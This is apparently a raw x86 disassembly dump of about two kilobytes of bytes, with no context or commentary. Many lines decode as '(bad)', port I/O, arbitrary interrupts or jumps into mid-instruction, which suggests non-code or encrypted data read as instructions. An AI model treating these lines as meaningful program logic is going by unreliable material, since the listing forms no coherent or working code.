  4276bf:	lods   eax,DWORD PTR ds:[esi]
  4276c0:	std    
  4276c1:	add    al,0xe9
  4276c3:	std    
  4276c4:	shr    ebx,cl
  4276c6:	sub    BYTE PTR [ebx],bh
  4276c8:	ficom  DWORD PTR [esi-0x2c]
  4276cb:	aaa    
  4276cc:	ficom  WORD PTR [ebx]
  4276ce:	adc    dh,bh
  4276d0:	mov    ebp,0x1225230a
  4276d5:	clc    
  4276d6:	aam    0x37
  4276d8:	ficom  WORD PTR [ebx]
  4276da:	adc    dh,ah
  4276dc:	mov    ebp,0x8725230a
  4276e1:	leave  
  4276e2:	sbb    esi,esp
  4276e4:	push   ebx
  4276e5:	jge    0x42773a
  4276e7:	cdq    
  4276e8:	pop    ebp
  4276e9:	mov    ebp,0x1225230a
  4276ee:	add    dl,dh
  4276f0:	aaa    
  4276f1:	ficom  WORD PTR [ebx]
  4276f3:	cmp    esi,ecx
  4276f5:	adc    bh,dl
  4276f7:	out    0x37,al
  4276f9:	ficom  WORD PTR [ebx]
  4276fb:	(bad)  
  4276fc:	sbb    eax,DWORD PTR [ebx-0xf]
  4276ff:	(bad)  
  427700:	das    
  427701:	adc    dl,BYTE PTR [esi-0x1]
  427704:	das    
  427705:	stos   DWORD PTR es:[edi],eax
  427706:	push   es
  427707:	in     eax,0x9b
  427709:	xchg   edi,eax
  42770a:	imul   bl
  42770c:	and    al,0x81
  42770e:	add    BYTE PTR [eax-0x32776933],0xd6
  427715:	dec    esp
  427716:	int    0xa6
  427718:	mov    ch,cl
  42771a:	out    0x4c,al
  42771c:	cmp    edx,DWORD PTR [ecx]
  42771e:	pop    edi
  42771f:	jnp    0x427758
  427721:	ficom  WORD PTR [ebx]
  427723:	cmp    esp,ebx
  427725:	das    
  427726:	inc    ebp
  427727:	sti    
  427728:	xchg   edx,eax
  427729:	shr    edi,cl
  42772b:	xchg   edx,eax
  42772c:	cmp    eax,DWORD PTR [eax]
  42772e:	shl    ebp,cl
  427730:	sub    BYTE PTR [edx],cl
  427732:	(bad)  
  427733:	cmc    
  427734:	push   ebx
  427735:	fxch   st(5)
  427737:	out    0xf5,al
  427739:	imul   eax,DWORD PTR [eax+0x3b6c8080],0xcdfc53a9
  427743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427744:	and    al,0xcd
  427746:	and    ecx,DWORD PTR [edx]
  427748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427749:	adc    DWORD PTR [ebx-0x1e],eax
  42774c:	(bad)  
  42774d:	xchg   BYTE PTR [ebx],bh
  42774f:	fiadd  DWORD PTR [ebx-0x27]
  427752:	aam    0x20
  427754:	add    dh,dl
  427756:	xor    al,0xcd
  427758:	(bad)  
  427759:	and    al,0x0
  42775b:	(bad)  
  42775c:	sub    al,0x0
  42775e:	(bad)  
  42775f:	std    
  427760:	add    BYTE PTR [eax-0x43],bl
  427763:	sub    edi,eax
  427765:	add    BYTE PTR [eax],al
  427767:	or     al,BYTE PTR [esi-0x7f7f9615]
  42776d:	or     ch,0x96
  427770:	mov    ch,cl
  427772:	out    0x4c,al
  427774:	cmp    edi,ecx
  427776:	cmp    esp,ebx
  427778:	das    
  427779:	inc    ebp
  42777a:	add    edx,DWORD PTR [edx+0xa9210d3]
  427780:	out    0xf5,al
  427782:	int    0xe6
  427784:	mov    ch,cl
  427786:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427787:	dec    esp
  427788:	shr    ecx,cl
  42778a:	sub    BYTE PTR [ebx],bh
  42778c:	dec    ebp
  42778e:	(bad)  
  42778f:	cmc    
  427790:	cmp    ebx,ebp
  427792:	push   ebx
  427793:	clc    
  427794:	int    0xe6
  427796:	xor    BYTE PTR [ebx],bh
  427798:	cli    
  427799:	push   ebx
  42779a:	aad    0xcd
  42779c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42779d:	adc    al,0x3b
  42779f:	popf   
  4277a0:	int    0xc9
  4277a2:	int    0xe6
  4277a4:	xor    ch,cl
  4277a6:	or     al,0xcd
  4277a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277a9:	adc    al,0x2f
  4277ab:	inc    ebp
  4277ac:	jge    0x427740
  4277ae:	shr    ecx,cl
  4277b0:	sub    BYTE PTR [ebx],bh
  4277b2:	fst    st(3)
  4277b4:	jmp    0x427748
  4277b6:	adc    bh,al
  4277b8:	add    BYTE PTR [eax-0x3aac9380],0x53
  4277bf:	lock inc ebx
  4277c1:	icebp  
  4277c2:	(bad)  
  4277c3:	sbb    BYTE PTR [ebx+0x2],al
  4277c6:	(bad)  
  4277c7:	and    dh,BYTE PTR [ecx+0x761dfc3b]
  4277cd:	mov    esi,0xdd8bf56d
  4277d2:	(bad)  
  4277d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4277d4:	cmp    edi,esp
  4277d6:	sbb    eax,0xcd62ec76
  4277db:	jbe    0x427765
  4277dd:	int    0x8d
  4277df:	dec    esp
  4277e0:	int    0x96
  4277e2:	mov    ch,cl
  4277e4:	(bad)  
  4277e5:	dec    esp
  4277e6:	adc    al,BYTE PTR [edx]
  4277e8:	mov    ebp,0x5625230a
  4277ed:	jnp    0x427826
  4277ef:	ficom  WORD PTR [ebx]
  4277f1:	das    
  4277f2:	inc    ebp
  4277f3:	jge    0x427787
  4277f5:	int    0xfb
  4277f7:	cmp    eax,DWORD PTR [eax]
  4277f9:	cmp    ebx,edx
  4277fb:	sar    DWORD PTR [ecx-0x2cfcc4d8],cl
  427801:	jmp    0x427795
  427803:	adc    dh,bh
  427805:	add    BYTE PTR [eax-0x36ac9380],0x53
  42780c:	divps  xmm6,XMMWORD PTR [esi-0x3]
  427810:	(bad)  
  427811:	test   BYTE PTR [ebx-0x1d],al
  427814:	aam    0x4c
  427816:	adc    al,BYTE PTR [esi-0x3e]
  427819:	gs sub al,0x1
  42781c:	jo     0x427858
  42781e:	mov    edx,0x124aece0
  427823:	ss inc edx
  427825:	das    
  427826:	sbb    edx,esi
  427828:	mov    ebx,0xaa029f75
  42782d:	test   al,0x63
  42782f:	retf   
  427830:	shr    BYTE PTR [eax+eax*4],cl
  427833:	xchg   esi,eax
  427834:	int    0xed
  427836:	add    al,0xed
  427838:	dec    esp
  427839:	int    0x76
  42783b:	mov    ch,cl
  42783d:	lea    ecx,[edi+ebp*1+0x45]
  427841:	jge    0x4277d5
  427843:	shr    ebx,cl
  427845:	xchg   edx,eax
  427846:	int    0x8d
  427848:	mov    ch,cl
  42784a:	xchg   esi,eax
  42784b:	dec    esp
  42784c:	cwde   
  42784d:	shl    edx,cl
  42784f:	sub    ch,cl
  427851:	lea    ebx,[ecx+ebp*2]
  427854:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427855:	mov    esi,0x793b4229
  42785a:	cmp    ebx,edx
  42785c:	push   ebx
  42785d:	ror    BYTE PTR [edx],cl
  42785f:	or     ebp,0x1cd2476
  427865:	xor    eax,0xcd808081
  42786a:	mov    ch,cl
  42786c:	jbe    0x427892
  42786e:	int    0x1
  427870:	xor    eax,0xcd808081
  427875:	add    BYTE PTR [edi-0x72329b92],0x24
  42787c:	int    0xa
  42787e:	adc    DWORD PTR [ecx+0x7ecd8080],eax
  427884:	adc    al,0xc0
  427886:	test   BYTE PTR [eax+eax*4+0x808050],bh
  42788d:	nop
  42788e:	jo     0x4278f2
  427890:	add    bl,ah
  427892:	or     cl,BYTE PTR [ebx-0x32778933]
  427898:	lea    ecx,[edi+ebp*1+0x45]
  42789c:	jge    0x427830
  42789e:	shr    ebx,cl
  4278a0:	xchg   edx,eax
  4278a1:	int    0x8d
  4278a3:	mov    ch,cl
  4278a5:	xchg   esi,eax
  4278a6:	dec    esp
  4278a7:	add    dh,dl
  4278a9:	and    al,0x3b
  4278ab:	jns    0x4278e8
  4278ad:	ficom  DWORD PTR [ebx-0x2e]
  4278b0:	or     dh,BYTE PTR [esi-0x3]
  4278b3:	iret   
  4278b4:	jbe    0x4278b3
  4278b6:	jo     0x427852
  4278b8:	add    dh,dl
  4278ba:	sbb    al,0xd3
  4278bc:	repnz sub BYTE PTR [eax],al
  4278bf:	(bad)  
  4278c0:	adc    al,0x0
  4278c2:	(bad)  
  4278c3:	xor    BYTE PTR [eax],al
  4278c5:	(bad)  
  4278c6:	dec    esp
  4278c7:	add    dh,dl
  4278c9:	mov    BYTE PTR [ebp+0xfe2b],bh
  4278cf:	int    0x76
  4278d1:	mov    ch,cl
  4278d3:	lea    ecx,[edi+ebp*1+0x45]
  4278d7:	jge    0x42786b
  4278d9:	shr    ebx,cl
  4278db:	xchg   edx,eax
  4278dc:	int    0x8d
  4278de:	mov    ch,cl
  4278e0:	xchg   esi,eax
  4278e1:	dec    esp
  4278e2:	cmp    edi,DWORD PTR [ecx+0x3b]
  4278e5:	fcmovbe st,st(3)
  4278e7:	repnz sub ch,cl
  4278ea:	das    
  4278eb:	push   ebx
  4278ec:	rol    BYTE PTR [ebx+0x7d],cl
  4278ef:	aam    0x36
  4278f1:	int    0x76
  4278f3:	xor    ch,cl
  4278f5:	lea    edx,[edi+ebp*1]
  4278f8:	inc    ebp
  4278f9:	jge    0x42788d
  4278fb:	shr    ebx,cl
  4278fd:	xchg   edx,eax
  4278fe:	int    0x8d
  427900:	xor    ch,cl
  427902:	xchg   esi,eax
  427903:	adc    al,0x3b
  427905:	jns    0x427942
  427907:	fcmovbe st,st(3)
  427909:	repnz sub ch,cl
  42790c:	lea    ebx,[ebx+edx*2]
  42790f:	shr    BYTE PTR [edi],cl
  427911:	shl    DWORD PTR [esi-0x3],1
  427914:	or     al,BYTE PTR [ecx+0x1cd2cba8]
  42791a:	adc    BYTE PTR [esi+0x5b71edcd],0x98
  427921:	call   0xcd3c:0xd6cd6d3b
  427928:	xchg   esi,eax
  427929:	inc    esp
  42792a:	int    0xe6
  42792c:	and    al,0x5d
  42792e:	mov    ebp,0x5f25230a
  427933:	jnp    0x42796c
  427935:	ficom  WORD PTR [ebx]
  427937:	inc    ebx
  427938:	icebp  
  427939:	das    
  42793a:	or     BYTE PTR [edi],al
  42793c:	add    BYTE PTR [eax-0x4613080],0x82
  427943:	test   BYTE PTR [ebx-0xc],al
  427946:	jnp    0x42792e
  427948:	inc    ebx
  427949:	hlt    
  42794a:	(bad)  
  42794b:	mov    BYTE PTR [ebx-0xf],al
  42794e:	das    
  42794f:	add    eax,0x80809216
  427954:	adc    bh,bh
  427956:	jno    0x42798f
  427958:	ficom  WORD PTR [ebx]
  42795a:	(bad)  
  42795b:	mov    BYTE PTR [ebx-0xf],al
  42795e:	das    
  42795f:	add    eax,0x80809285
  427964:	adc    bh,bh
  427966:	xchg   esi,eax
  427967:	aaa    
  427968:	ficom  WORD PTR [ebx]
  42796a:	(bad)  
  42796b:	mov    BYTE PTR [ebx-0xf],al
  42796e:	das    
  42796f:	add    eax,0x808080f8
  427974:	adc    bh,bh
  427976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427977:	aaa    
  427978:	ficom  WORD PTR [ebx]
  42797a:	(bad)  
  42797b:	test   BYTE PTR [ebx-0xf],al
  42797e:	aam    0x3e
  427980:	adc    bh,bh
  427982:	scas   al,BYTE PTR es:[edi]
  427983:	aaa    
  427984:	ficom  WORD PTR [ebx]
  427986:	(bad)  
  427987:	mov    BYTE PTR [ebx-0xf],al
  42798a:	das    
  42798b:	add    eax,0x808081db
  427990:	adc    bh,bh
  427992:	mov    dh,0x37
  427994:	ficom  WORD PTR [ebx]
  427996:	das    
  427997:	push   es
  427998:	into   
  427999:	add    DWORD PTR [eax+0x2ff14380],0x80809f05
  4279a3:	sub    bl,0x12
  4279a6:	add    DWORD PTR [eax+0x1cd60080],0x2cd600
  4279b0:	(bad)  
  4279b1:	adc    al,0x0
  4279b3:	(bad)  
  4279b4:	xor    BYTE PTR [eax],al
  4279b6:	(bad)  
  4279b7:	dec    esp
  4279b8:	add    dh,dl
  4279ba:	mov    BYTE PTR [ebp+0xff77],bh
  4279c0:	jmp    0x427978
  4279c2:	add    DWORD PTR [eax-0x3900ed80],0xd613de37
  4279cc:	mov    BYTE PTR [ebx-0xf],al
  4279cf:	das    
  4279d0:	add    eax,0x80808019
  4279d5:	adc    bh,bh
  4279d7:	xchg   ecx,eax
  4279d8:	aaa    
  4279d9:	ficom  WORD PTR [ebx]
  4279db:	(bad)  
  4279dc:	mov    BYTE PTR [ebx-0xf],al
  4279df:	das    
  4279e0:	add    eax,0x8080818e
  4279e5:	adc    bh,bh
  4279e7:	(bad)  
  4279e8:	aaa    
  4279e9:	ficom  WORD PTR [ebx]
  4279eb:	(bad)  
  4279ec:	test   BYTE PTR [ebx-0xf],al
  4279ef:	aam    0x1c
  4279f1:	adc    bh,bh
  4279f3:	fidiv  WORD PTR [edi]
  4279f5:	ficom  WORD PTR [ebx]
  4279f7:	(bad)  
  4279f8:	mov    BYTE PTR [ebx-0xf],al
  4279fb:	das    
  4279fc:	add    eax,0x80808142
  427a01:	adc    bh,bh
  427a03:	out    0x37,al
  427a05:	ficom  WORD PTR [ebx]
  427a07:	in     al,dx
  427a08:	iret   
  427a09:	int    0x96
  427a0b:	mov    ch,cl
  427a0d:	(bad)  
  427a0e:	dec    esp
  427a0f:	int    0xe6
  427a11:	mov    ch,cl
  427a13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a14:	dec    esp
  427a15:	cmp    edx,DWORD PTR [ecx]
  427a17:	cmp    esp,ebx
  427a19:	das    
  427a1a:	inc    ebp
  427a1b:	sti    
  427a1c:	xchg   edx,eax
  427a1d:	shr    ecx,cl
  427a1f:	sub    BYTE PTR [edx],dl
  427a21:	clc    
  427a22:	add    BYTE PTR [eax-0x102c9380],0x92
  427a29:	cmp    ebx,ebp
  427a2b:	push   ebx
  427a2c:	clc    
  427a2d:	int    0xe6
  427a2f:	mov    BYTE PTR [ebx-0x2b],dl
  427a32:	int    0xa6
  427a34:	dec    esp
  427a35:	xchg   ecx,ebx
  427a37:	sbb    esi,esp
  427a39:	or     dl,BYTE PTR [esi+0x4cd60a88]
  427a3f:	int    0x96
  427a41:	mov    ch,cl
  427a43:	(bad)  
  427a44:	dec    esp
  427a45:	int    0xe6
  427a47:	mov    ch,cl
  427a49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a4a:	dec    esp
  427a4b:	cmp    edx,DWORD PTR [ecx]
  427a4d:	cmp    esp,ebx
  427a4f:	das    
  427a50:	inc    ebp
  427a51:	sti    
  427a52:	xchg   edx,eax
  427a53:	shr    ecx,cl
  427a55:	sub    BYTE PTR [ebx],bh
  427a57:	fst    st(3)
  427a59:	out    dx,eax
  427a5a:	xchg   edx,eax
  427a5b:	adc    bh,al
  427a5d:	add    BYTE PTR [eax-0x2aac9380],0x53
  427a64:	clc    
  427a65:	ds xchg esi,eax
  427a67:	xor    BYTE PTR [esi],bl
  427a69:	(bad)  
  427a6a:	adc    al,0xcd
  427a6c:	xchg   esi,eax
  427a6d:	cmp    al,0xcd
  427a6f:	(bad)  
  427a70:	inc    esp
  427a71:	int    0x96
  427a73:	xor    ch,cl
  427a75:	(bad)  
  427a76:	adc    al,0xcd
  427a78:	xchg   esi,eax
  427a79:	xor    ch,cl
  427a7b:	(bad)  
  427a7c:	adc    al,0xcd
  427a7e:	out    0x30,al
  427a80:	int    0xa6
  427a82:	adc    al,0x3b
  427a84:	adc    DWORD PTR [ebx],edi
  427a86:	jecxz  0x427ab7
  427a88:	inc    ebp
  427a89:	sti    
  427a8a:	xchg   edx,eax
  427a8b:	shr    ecx,cl
  427a8d:	sub    BYTE PTR [ebx],bh
  427a8f:	fst    QWORD PTR [edx]
  427a91:	clc    
  427a92:	add    BYTE PTR [eax-0x102c9380],0x92
  427a99:	push   ebx
  427a9a:	clc    
  427a9b:	int    0xe6
  427a9d:	cmp    al,0x53
  427a9f:	aad    0xcd
  427aa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427aa2:	inc    esp
  427aa3:	cmp    edi,edx
  427aa5:	cmp    ebx,DWORD PTR [ebp-0x32c38933]
  427aab:	lea    eax,[edi+ebp*1+0x45]
  427aaf:	loope  0x427a43
  427ab1:	cmp    ecx,ebx
  427ab3:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427ab9:	sub    BYTE PTR [ebx+edx*2-0x6],0xcd
  427abe:	lea    esi,[eax]
  427ac0:	shr    esp,cl
  427ac2:	xchg   edx,eax
  427ac3:	push   ebx
  427ac4:	popf   
  427ac5:	xchg   ecx,ebx
  427ac7:	int    0x96
  427ac9:	adc    al,0x1b
  427acb:	hlt    
  427acc:	add    al,0xf2
  427ace:	std    
  427acf:	shr    edi,cl
  427ad1:	sub    BYTE PTR [ebx],bh
  427ad3:	ins    DWORD PTR es:[edi],dx
  427ad4:	adc    al,BYTE PTR [edx]
  427ad6:	aam    0x37
  427ad8:	ficom  WORD PTR [ebx]
  427ada:	adc    bh,bl
  427adc:	mov    ebp,0xcd25230a
  427ae1:	out    0x3c,al
  427ae3:	int    0xa6
  427ae5:	inc    esp
  427ae6:	add    al,0xe9
  427ae8:	std    
  427ae9:	adc    bh,al
  427aeb:	aam    0x37
  427aed:	ficom  WORD PTR [ebx]
  427aef:	adc    dh,ah
  427af1:	mov    ebp,0x8725230a
  427af6:	lock int 0xe6
  427af9:	and    al,0x1b
  427afb:	aad    0x53
  427afd:	rcl    BYTE PTR [esi-0x43],cl
  427b00:	or     ah,BYTE PTR [ebx]
  427b02:	and    eax,0x12025370
  427b07:	not    esi
  427b09:	aaa    
  427b0a:	ficom  WORD PTR [ebx]
  427b0c:	cwde   
  427b0d:	add    dh,dl
  427b0f:	xor    al,0x0
  427b11:	(bad)  
  427b12:	sub    al,0x9a
  427b14:	add    dh,dl
  427b16:	sbb    al,0x0
  427b18:	(bad)  
  427b19:	adc    al,0x0
  427b1b:	(bad)  
  427b1c:	xor    BYTE PTR [eax],al
  427b1e:	(bad)  
  427b1f:	dec    esp
  427b20:	add    dh,dl
  427b22:	mov    BYTE PTR [ebp+0xfef4],bh
  427b28:	or     cl,BYTE PTR [ebx-0x57557433]
  427b2e:	arpl   bx,cx
  427b30:	sar    BYTE PTR [eax+eax*4],cl
  427b33:	int    0x96
  427b35:	mov    ch,cl
  427b37:	(bad)  
  427b38:	dec    esp
  427b39:	int    0xe6
  427b3b:	mov    ch,cl
  427b3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b3e:	dec    esp
  427b3f:	cmp    esp,ebx
  427b41:	cmp    edx,DWORD PTR [ecx]
  427b43:	das    
  427b44:	inc    ebp
  427b45:	sti    
  427b46:	xchg   edx,eax
  427b47:	shr    ecx,cl
  427b49:	sub    BYTE PTR [edx],dl
  427b4b:	clc    
  427b4c:	add    BYTE PTR [eax-0x102c9380],0x92
  427b53:	cmp    ebx,ebp
  427b55:	push   ebx
  427b56:	aad    0x53
  427b58:	clc    
  427b59:	int    0xe6
  427b5b:	xor    ch,cl
  427b5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b5e:	adc    al,0x53
  427b60:	fst    DWORD PTR [ebx-0xc]
  427b63:	or     dl,BYTE PTR [esi+0x14d60a30]
  427b69:	int    0x96
  427b6b:	cmp    al,0xcd
  427b6d:	(bad)  
  427b6e:	inc    esp
  427b6f:	int    0x96
  427b71:	xor    ch,cl
  427b73:	(bad)  
  427b74:	adc    al,0xcd
  427b76:	xchg   esi,eax
  427b77:	mov    ch,cl
  427b79:	(bad)  
  427b7a:	dec    esp
  427b7b:	int    0x96
  427b7d:	mov    ch,cl
  427b7f:	(bad)  
  427b80:	dec    esp
  427b81:	int    0xe6
  427b83:	mov    ch,cl
  427b85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b86:	dec    esp
  427b87:	cmp    esp,ebx
  427b89:	cmp    edx,DWORD PTR [ecx]
  427b8b:	das    
  427b8c:	inc    ebp
  427b8d:	sti    
  427b8e:	xchg   edx,eax
  427b8f:	shr    ecx,cl
  427b91:	sub    BYTE PTR [edx],dl
  427b93:	clc    
  427b94:	add    BYTE PTR [eax-0x22c49380],0x53
  427b9b:	aad    0xd3
  427b9d:	out    dx,eax
  427b9e:	xchg   edx,eax
  427b9f:	push   ebx
  427ba0:	clc    
  427ba1:	int    0xe6
  427ba3:	xor    ch,cl
  427ba5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ba6:	adc    al,0x3b
  427ba8:	cli    
  427ba9:	cmp    ebx,DWORD PTR [ebp-0x32cf8933]
  427baf:	lea    edx,[edi+ebp*1]
  427bb2:	inc    ebp
  427bb3:	loope  0x427b47
  427bb5:	cmp    ecx,ebx
  427bb7:	push   ebx
  427bb8:	cli    
  427bb9:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427bbf:	sub    BYTE PTR [ebx+edx*8-0x14],0x92
  427bc4:	push   ebx
  427bc5:	popf   
  427bc6:	int    0x76
  427bc8:	cmp    al,0xcd
  427bca:	lea    eax,[edi+eax*4-0x27]
  427bce:	int    0xe6
  427bd0:	cmp    al,0x1b
  427bd2:	hlt    
  427bd3:	int    0xa6
  427bd5:	inc    esp
  427bd6:	adc    al,BYTE PTR [edx]
  427bd8:	mov    ebp,0x5625230a
  427bdd:	jnp    0x427c16
  427bdf:	ficom  WORD PTR [ebx]
  427be1:	das    
  427be2:	inc    ebp
  427be3:	jge    0x427b77
  427be5:	shr    ecx,cl
  427be7:	sub    bl,dl
  427be9:	jmp    0x427b7d
  427beb:	cmp    ebx,ebp
  427bed:	adc    bh,al
  427bef:	add    BYTE PTR [eax-0xfac9380],0x53
  427bf6:	lds    eax,FWORD PTR [edi-0x32fde40f]
  427bfc:	lea    ecx,[eax-0x32b36933]
  427c02:	out    0x30,al
  427c04:	int    0xa6
  427c06:	adc    al,0x4
  427c08:	repnz std 
  427c0a:	add    al,0xe9
  427c0c:	std    
  427c0d:	adc    al,BYTE PTR [edx]
  427c0f:	aam    0x37
  427c11:	ficom  WORD PTR [ebx]
  427c13:	adc    bh,al
  427c15:	aam    0x37
  427c17:	ficom  WORD PTR [ebx]
  427c19:	shr    edi,cl
  427c1b:	sub    BYTE PTR [ebx],bh
  427c1d:	ins    DWORD PTR es:[edi],dx
  427c1e:	adc    bh,bl
  427c20:	mov    ebp,0x1225230a
  427c25:	hlt    
  427c26:	mov    ebp,0x8725230a
  427c2b:	lock sbb edx,ebp
  427c2e:	jmp    0x427c77
  427c30:	inc    DWORD PTR [eax]
  427c32:	add    BYTE PTR [esi-0x12fb1233],dl
  427c38:	sbb    al,0x98
  427c3a:	pop    edi
  427c3b:	(bad)  
  427c3c:	aaa    
  427c3d:	ficom  WORD PTR [ebx]
  427c3f:	or     cl,BYTE PTR [ebp+0xabd5d11]
  427c45:	and    esp,DWORD PTR ds:0xc9f5760a
  427c4b:	jbe    0x427c0a
  427c4d:	xchg   ecx,eax
  427c4e:	aaa    
  427c4f:	ficom  WORD PTR [ebx]
  427c51:	or     dh,BYTE PTR [esi-0x13]
  427c54:	int    0x96
  427c56:	adc    ebp,ecx
  427c58:	(bad)  
  427c59:	cmc    
  427c5a:	call   0xefd3:0x92fb452f
  427c61:	xchg   edx,eax
  427c62:	int    0xd6
  427c64:	adc    ebp,ecx
  427c66:	out    0xf5,al
  427c68:	jo     0x427c7c
  427c6a:	sti    
  427c6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c6c:	mov    esi,0x3b4229
  427c71:	jno    0x427cc6
  427c73:	(bad)  [edx]
  427c75:	xchg   esi,eax
  427c76:	std    
  427c77:	int    0x96
  427c79:	dec    esp
  427c7a:	or     dl,BYTE PTR [esi+0x4cd6004c]
  427c80:	iret   
  427c81:	jbe    0x427c80
  427c83:	add    dh,dl
  427c85:	mov    bl,dl
  427c87:	mov    ecx,0xd6007028
  427c8c:	dec    esp
  427c8d:	add    dh,dl
  427c8f:	in     eax,dx
  427c90:	add    dh,dl
  427c92:	mov    ebp,0xf5d600
  427c97:	(bad)  
  427c98:	adc    DWORD PTR [ebp+0xfde6],edi
  427c9e:	stos   BYTE PTR es:[edi],al
  427c9f:	or     dh,BYTE PTR [esi-0x3]
  427ca2:	int    0x76
  427ca4:	std    
  427ca5:	test   al,0xcb
  427ca7:	ror    BYTE PTR [eax-0x12326980],cl
  427cad:	add    al,0xb5
  427caf:	stc    
  427cb0:	add    al,0xed
  427cb2:	inc    esp
  427cb3:	cwde   
  427cb4:	leave  
  427cb5:	je     0x427ceb
  427cb7:	xor    al,0x80
  427cb9:	add    BYTE PTR [eax+0x3474c980],0x44
  427cc0:	add    BYTE PTR [eax+0x74cf8080],0x34
  427cc7:	xor    BYTE PTR [eax+0x0],dh
  427cca:	(bad)  
  427ccb:	xor    al,0x0
  427ccd:	(bad)  
  427cce:	sub    al,0x0
  427cd0:	(bad)  
  427cd1:	and    al,0x0
  427cd3:	(bad)  
  427cd4:	sbb    al,0x0
  427cd6:	(bad)  
  427cd7:	adc    al,0x0
  427cd9:	(bad)  
  427cda:	xor    BYTE PTR [eax],al
  427cdc:	(bad)  
  427cdd:	dec    esp
  427cde:	add    dh,dl
  427ce0:	mov    BYTE PTR [ebp+0xe7e7],bh
  427ce6:	int    0x76
  427ce8:	mov    BYTE PTR [edx],cl
  427cea:	je     0x427d20
  427cec:	test   ch,cl
  427cee:	je     0x427d24
  427cf0:	xor    al,0x6
  427cf2:	ins    DWORD PTR es:[edi],dx
  427cf3:	das    
  427cf4:	add    eax,0x80808017
  427cf9:	int    0x74
  427cfb:	xor    al,0x44
  427cfd:	push   es
  427cfe:	ins    DWORD PTR es:[edi],dx
  427cff:	das    
  427d00:	add    eax,0x8080800a
  427d05:	add    ah,dl
  427d07:	xor    al,0x24
  427d09:	add    ah,dl
  427d0b:	xor    al,0x24
  427d0d:	add    ah,dl
  427d0f:	xor    al,0x24
  427d11:	int    0x74
  427d13:	xor    al,0x50
  427d15:	add    cl,dh
  427d17:	int    0x74
  427d19:	xor    al,0x84
  427d1b:	int    0x74
  427d1d:	xor    al,0x84
  427d1f:	int    0x74
  427d21:	xor    al,0x84
  427d23:	iret   
  427d24:	jbe    0x427caa
  427d26:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427d2a:	int    0x74
  427d2c:	xor    al,0x3c
  427d2e:	xchg   DWORD PTR [esp+esi*1-0x7c],esi
  427d32:	or     dh,BYTE PTR [esp+esi*1-0x7c]
  427d36:	int    0x74
  427d38:	xor    al,0x84
  427d3a:	int    0x74
  427d3c:	xor    al,0x84
  427d3e:	int    0x8c
  427d40:	xor    al,0x84
  427d42:	int    0xa
  427d44:	and    eax,0xcd808081
  427d49:	xor    ebp,ecx
  427d4b:	aam    0x34
  427d4d:	mov    ch,cl
  427d4f:	add    DWORD PTR ds:0x5e808081,ebp
  427d55:	sbb    BYTE PTR [edi],ch
  427d57:	or     edx,DWORD PTR ds:0xcd808081
  427d5d:	xor    ch,cl
  427d5f:	push   eax
  427d60:	int    0x62
  427d62:	fs iret 
  427d64:	xchg   esp,eax
  427d65:	sbb    BYTE PTR [eax-0x33],dh
  427d68:	push   ecx
  427d69:	int    0x22
  427d6b:	xchg   DWORD PTR [ecx-0x77cb2b33],ebx
  427d71:	pop    esi
  427d72:	sbb    BYTE PTR [edi],ch
  427d74:	add    al,0x7b
  427d76:	add    DWORD PTR [eax+0x3494cd80],0xcd51cd88
  427d80:	dec    edx
  427d81:	int    0x80
  427d83:	xor    ecx,DWORD PTR [edi]
  427d85:	xchg   ebx,edx
  427d87:	or     dl,BYTE PTR [edx-0x7f7e8d15]
  427d8d:	or     ch,0x74
  427d90:	xor    al,0x44
  427d92:	push   es
  427d93:	ins    DWORD PTR es:[edi],dx
  427d94:	das    
  427d95:	push   es
  427d96:	cwde   
  427d97:	add    DWORD PTR [eax+0x3474cd80],0x2d01cd84
  427da1:	add    DWORD PTR [eax+0xa80cd80],0xcd4c3474
  427dab:	je     0x427de1
  427dad:	test   ch,cl
  427daf:	add    DWORD PTR ds:0xcd808081,esp
  427db5:	or     BYTE PTR [edx],0x74
  427db8:	xor    al,0x4c
  427dba:	int    0x74
  427dbc:	xor    al,0x84
  427dbe:	int    0x1
  427dc0:	or     DWORD PTR [ecx-0x7f327f80],eax
  427dc6:	int    0x80
  427dc8:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427dcc:	int    0x74
  427dce:	xor    al,0x84
  427dd0:	int    0x1
  427dd2:	int3   
  427dd3:	add    DWORD PTR [eax-0x327f3280],0x34740a80
  427ddd:	dec    esp
  427dde:	int    0x74
  427de0:	xor    al,0x84
  427de2:	int    0x8c
  427de4:	xor    al,0x84
  427de6:	int    0x1
  427de8:	popf   
  427de9:	add    DWORD PTR [eax-0x62f53280],0xcd808081
  427df3:	or     ch,0x89
  427df6:	imul   edx,ecx,0x3b358621
  427dfc:	jns    0x427e02
  427dfe:	add    bh,bh
  427e00:	sar    DWORD PTR [ebp+0x28f2d392],cl
  427e06:	push   ebx
  427e07:	jge    0x427e13
  427e09:	mov    WORD PTR [esp+ecx*2],?
  427e0c:	leave  
  427e0d:	je     0x427e43
  427e0f:	mov    BYTE PTR [eax-0x327f7f80],al
  427e15:	je     0x427e4b
  427e17:	xor    al,0x6
  427e19:	ins    DWORD PTR es:[edi],dx
  427e1a:	aam    0x73
  427e1c:	int    0x74
  427e1e:	xor    al,0x30
  427e20:	add    al,0xbd
  427e22:	adc    ah,0x52
  427e25:	jl     0x427dfb
  427e27:	cmp    edi,DWORD PTR [esp+edi*2-0x2c]
  427e2b:	and    edi,DWORD PTR [esi+edx*8+0x52]
  427e2f:	add    ah,dl
  427e31:	xor    al,0x2c
  427e33:	add    ah,dl
